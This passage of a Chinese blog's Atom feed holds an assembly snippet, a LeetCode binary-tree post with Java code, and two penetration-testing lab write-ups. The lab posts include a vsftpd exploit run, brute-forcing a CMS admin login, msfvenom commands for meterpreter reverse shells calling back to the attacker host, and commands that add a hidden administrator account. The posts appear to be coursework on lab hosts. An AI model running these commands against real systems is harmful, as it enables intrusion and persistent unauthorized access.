    pop ax        ; AX=7c06H    pop bx        ; BX=076AH    mov ax,4c00H    int 21Hcodesg endsend</code></pre><p>PSP 的头两个字节是CD20,用debug加载，查看PSP的内容</p><p><img src="/posts/2e9d33db/1583847116112.png" alt></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;从汇编程序开始&quot;&gt;&lt;a href=&quot;#从汇编程序开始&quot; class=&quot;headerlink&quot; title=&quot;从汇编程序开始&quot;&gt;&lt;/a&gt;从汇编程序开始&lt;/h2&gt;&lt;pre&gt;&lt;code class=&quot;x86asm&quot;&gt;assume cs:codesg

codesg se
      
    
    </summary>
    
    
      <category term="编程" scheme="http://prontosil.com/categories/%E7%BC%96%E7%A8%8B/"/>
    
    
      <category term="汇编" scheme="http://prontosil.com/tags/%E6%B1%87%E7%BC%96/"/>
    
  </entry>
  
  <entry>
    <title>每天一道leetcode-二叉树的直径</title>
    <link href="http://prontosil.com/posts/c2fa82b5/"/>
    <id>http://prontosil.com/posts/c2fa82b5/</id>
    <published>2020-03-10T13:17:16.000Z</published>
    <updated>2020-03-10T14:46:52.898Z</updated>
    
    <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定一棵二叉树，你需要计算它的直径长度。一棵二叉树的直径长度是任意两个结点路径长度中的最大值。这条路径可能穿过根结点。</p><p>示例 :<br>给定二叉树</p><pre><code>      1     / \    2   3   / \       4   5    </code></pre><p>返回 3, 它的长度是路径 [4,2,1,3] 或者 [5,2,1,3]。</p><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>找到左子树的节点个数，右子树的节点个数，剩下的就好做了</p><p>我写了的lj代码</p><pre><code class="java">package March;/** * @description: 二叉树的直径 * @author: Pxy * @create: 2020-03-10 20:02 **//** * [4,-7,-3,null,null,-9,-3,9,-7,-4,null,6,null,-6,-6,null,null,0,6,5,null,9,null,null,-1,-4,null,null,null,-2] * 上面这个结果过不了 */public class diameterOfBinaryTree {    class TreeNode{        int val;        TreeNode left;        TreeNode right;        TreeNode(int x){            val = x;}    }    public int diameterOfBinaryTree(TreeNode root) {        if (root == null) {            return 0;        }        if (root.right == null) {            return helper(root.left);        } else if (root.left == null) {            return helper(root.right);        } else {            int leftLength = helper(root.left);            int rightLength = helper(root.right);            return leftLength + rightLength;        }    }    public static int helper(TreeNode root) {        if (root != null) {            return Math.max(helper(root.left), helper(root.right)) + 1;        } else {            return 0;        }    }}</code></pre><p>但是leetcode提交的时候给了一个奇葩的测试样例</p><pre><code>[4,-7,-3,null,null,-9,-3,9,-7,-4,null,6,null,-6,-6,null,null,0,6,5,null,9,null,null,-1,-4,null,null,null,-2]</code></pre><p>这。。</p><p><img src="/posts/c2fa82b5/1583846422840.png" alt></p><p>算了我暂时也看不出哪里有问题</p><h2 id="官方"><a href="#官方" class="headerlink" title="官方"></a>官方</h2><pre><code class="java">class Solution {    int ans;    public int diameterOfBinaryTree(TreeNode root) {        ans = 1;        depth(root);        return ans - 1;    }    public int depth(TreeNode node) {        if (node == null) return 0; // 访问到空节点了，返回0        int L = depth(node.left); // 左儿子为根的子树的深度        int R = depth(node.right); // 右儿子为根的子树的深度        ans = Math.max(ans, L+R+1); // 计算d_node即L+R+1 并更新ans        return Math.max(L, R) + 1; // 返回该节点为根的子树的深度    }}</code></pre><p>思路也是比较简单的，不过这个用法很神奇，<code>depth</code> 函数有返回值，这个返回值只在递归的时候用到</p><p>java写OJ的时候如果要用全局变量，只需要在外面写一个就行了。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://leetcode-cn.com/problems/diameter-of-binary-tree/solution/liang-chong-si-lu-shi-yong-quan-ju-bian-liang-yu-b/" target="_blank" rel="noopener">https://leetcode-cn.com/problems/diameter-of-binary-tree/solution/liang-chong-si-lu-shi-yong-quan-ju-bian-liang-yu-b/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;题目&quot;&gt;&lt;a href=&quot;#题目&quot; class=&quot;headerlink&quot; title=&quot;题目&quot;&gt;&lt;/a&gt;题目&lt;/h2&gt;&lt;p&gt;给定一棵二叉树，你需要计算它的直径长度。一棵二叉树的直径长度是任意两个结点路径长度中的最大值。这条路径可能穿过根结点。&lt;/p&gt;
&lt;p&gt;示例 
      
    
    </summary>
    
    
      <category term="编程" scheme="http://prontosil.com/categories/%E7%BC%96%E7%A8%8B/"/>
    
    
      <category term="leetcode" scheme="http://prontosil.com/tags/leetcode/"/>
    
  </entry>
  
  <entry>
    <title>漏洞挖掘实验</title>
    <link href="http://prontosil.com/posts/12fff649/"/>
    <id>http://prontosil.com/posts/12fff649/</id>
    <published>2020-03-10T08:57:06.000Z</published>
    <updated>2020-03-10T09:52:51.342Z</updated>
    
    <content type="html"><![CDATA[<p>实验拓扑如下</p><p><img src="/posts/12fff649/1583830717716.png" alt></p><p><img src="/posts/12fff649/1583830733667.png" alt></p><h2 id="任务一-寻找漏洞主机"><a href="#任务一-寻找漏洞主机" class="headerlink" title="任务一 寻找漏洞主机"></a>任务一 寻找漏洞主机</h2><p>扫描存活主机(虽然知道了但还是扫一下)</p><p>注意本机ip是192.168.1.2</p><p><img src="/posts/12fff649/1583830890209.png" alt></p><p>-F 选项快速扫描一下其他主机</p><p><img src="/posts/12fff649/1583830929741.png" alt></p><p><img src="/posts/12fff649/1583830945755.png" alt></p><p>既然是ftp，那么就锁定192.168.1.3</p><p>提示了搜索vsftpd (靶机上搜索太慢了，我在自己机器上搜索的)</p><p><img src="/posts/12fff649/1583831162349.png" alt></p><p>然后使用这个exploit去打就行了</p><p><img src="/posts/12fff649/1583831194224.png" alt></p><p>可以看到进去就是root权限hhhh</p><p>然后还要搜索 1.key 这个文件</p><pre><code>find  / -name 1.key</code></pre><p><img src="/posts/12fff649/1583831225885.png" alt></p><p>读一下就好了</p><h2 id="任务二-使用nikto、crunch和burpsuite进行网站渗透和控制"><a href="#任务二-使用nikto、crunch和burpsuite进行网站渗透和控制" class="headerlink" title="任务二 使用nikto、crunch和burpsuite进行网站渗透和控制"></a>任务二 使用nikto、crunch和burpsuite进行网站渗透和控制</h2><p>此时的目标转向了 192.168.1.4 (192.168.1.3都拿到root了)</p><p>打开网站是 Cms made Simple 简称cms cms</p><p><img src="/posts/12fff649/1583831499729.png" alt></p><p>后台地址 <code>/admin/login.php</code></p><p>先设置一个代理</p><p><img src="/posts/12fff649/1583832214527.png" alt></p><p>然后抓个包</p><p><img src="/posts/12fff649/1583832242295.png" alt></p><p>由于密码是 <code>admin</code> 加上三位数字，如果想用 crunch 生成也行，直接用burp也行</p><p>爆破成功</p><p><img src="/posts/12fff649/1583832729565.png" alt></p><p>进入到网站后台</p><p><img src="/posts/12fff649/1583832774511.png" alt></p><h2 id="任务三-获取webshell权限并拿到目标及开放的远程桌面端口号"><a href="#任务三-获取webshell权限并拿到目标及开放的远程桌面端口号" class="headerlink" title="任务三 获取webshell权限并拿到目标及开放的远程桌面端口号"></a>任务三 获取webshell权限并拿到目标及开放的远程桌面端口号</h2><p>漏洞点在这</p><p><img src="/posts/12fff649/1583833127686.png" alt></p><p>Run一下</p><p><img src="/posts/12fff649/1583833240668.png" alt></p><p>好那我们这里为了避免网页卡顿。用msf生成一个shell.php</p><pre><code>msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.1.2 lport=4444 -f raw -o shell.txt</code></pre><p>然后复制到框框里运行一下</p><p>同时msf进行监听</p><p><img src="/posts/12fff649/1583833748737.png" alt></p><p>成功弹到shell。之后再使用msf生成shell.exe</p><pre><code>msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.1.2 lport=4444 -f exe -o shell.exe</code></pre><p>上传，重新弹一个shell</p><p><img src="/posts/12fff649/1583833790609.png" alt></p><p>ok这时候就能获得真正的meterpreter了</p><p>查看一下监听端口</p><p><img src="/posts/12fff649/1583833821793.png" alt></p><p>随便猜一个吧2333</p><h2 id="任务四-向目标主机添加用户并控制"><a href="#任务四-向目标主机添加用户并控制" class="headerlink" title="任务四 向目标主机添加用户并控制"></a>任务四 向目标主机添加用户并控制</h2><p>这个步骤和上一个实验比较相似，就不用细说了</p><pre><code>net user hacker Beijing123 /addnet localgroup administrators hacker /add</code></pre><p>远程登陆之后，给文件添加一个用户即可</p><p>最后</p><p><img src="/posts/12fff649/1583833940934.png" alt></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;实验拓扑如下&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/posts/12fff649/1583830717716.png&quot; alt&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/posts/12fff649/1583830733667.png&quot; alt&gt;&lt;/p&gt;
&lt;h2 id=&quot;任务一-
      
    
    </summary>
    
    
      <category term="渗透测试" scheme="http://prontosil.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="实验" scheme="http://prontosil.com/tags/%E5%AE%9E%E9%AA%8C/"/>
    
  </entry>
  
  <entry>
    <title>企业环境渗透2</title>
    <link href="http://prontosil.com/posts/c08799e1/"/>
    <id>http://prontosil.com/posts/c08799e1/</id>
    <published>2020-03-10T07:47:54.000Z</published>
    <updated>2020-03-10T08:37:26.299Z</updated>
    
    <content type="html"><![CDATA[<h2 id="任务一-weblogic反序列化"><a href="#任务一-weblogic反序列化" class="headerlink" title="任务一 weblogic反序列化"></a>任务一 weblogic反序列化</h2><p>weblogic介绍</p><p>浏览器访问192.168.2.10:7001 然后就404</p><p><img src="/posts/c08799e1/1583826737126.png" alt></p><p>使用工具包中的webloigc利用工具</p><p><img src="/posts/c08799e1/1583826784567.png" alt></p><p>看到flag了是不是，然后执行 <code>cat /home/flag</code> 是吧233333</p><p>其实，这个flag不过就是个目录。。</p><p><img src="/posts/c08799e1/1583826861077.png" alt></p><p>得到flag</p><p><img src="/posts/c08799e1/1583826902355.png" alt="1583826902355"></p><h2 id="任务二-Wrodpress-任意文件读取"><a href="#任务二-Wrodpress-任意文件读取" class="headerlink" title="任务二 Wrodpress 任意文件读取"></a>任务二 Wrodpress 任意文件读取</h2><p>wpscan常规扫描一下</p><p><img src="/posts/c08799e1/1583826949884.png" alt></p><p>存在一个任意文件读取漏洞(不能复制粘贴好难受)</p><p><img src="/posts/c08799e1/1583826994083.png" alt></p><h2 id="任务三-Wordpress命令执行"><a href="#任务三-Wordpress命令执行" class="headerlink" title="任务三 Wordpress命令执行"></a>任务三 Wordpress命令执行</h2><h2 id="任务四-改进漏洞利用脚本获得命令执行权限"><a href="#任务四-改进漏洞利用脚本获得命令执行权限" class="headerlink" title="任务四 改进漏洞利用脚本获得命令执行权限"></a>任务四 改进漏洞利用脚本获得命令执行权限</h2>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;任务一-weblogic反序列化&quot;&gt;&lt;a href=&quot;#任务一-weblogic反序列化&quot; class=&quot;headerlink&quot; title=&quot;任务一 weblogic反序列化&quot;&gt;&lt;/a&gt;任务一 weblogic反序列化&lt;/h2&gt;&lt;p&gt;weblogic介绍&lt;/p&gt;
      
    
    </summary>
    
    
      <category term="渗透测试" scheme="http://prontosil.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="实验" scheme="http://prontosil.com/tags/%E5%AE%9E%E9%AA%8C/"/>
    
  </entry>
  
</feed>
